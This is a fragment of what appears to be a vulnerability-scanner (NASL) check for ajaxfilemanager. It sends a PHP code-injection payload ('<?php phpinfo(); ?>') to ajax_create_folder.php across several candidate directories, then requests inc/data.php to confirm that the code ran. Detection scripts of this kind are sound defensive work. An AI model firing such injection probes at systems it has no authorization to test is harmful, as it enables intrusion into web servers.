...
ex = NASLString( "bla=1&blub=2&foo=<?php phpinfo(); ?>" );
for dir in nasl_make_list_unique( "/fm", "/file", "/filemanager", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	filename = NASLString( dir, "/ajaxfilemanager/ajax_create_folder.php" );
	...
	if(IsMatchRegexp( result, "^HTTP/1\\.[01] 200" )){
		url = NASLString( dir, "/ajaxfilemanager/inc/data.php" );
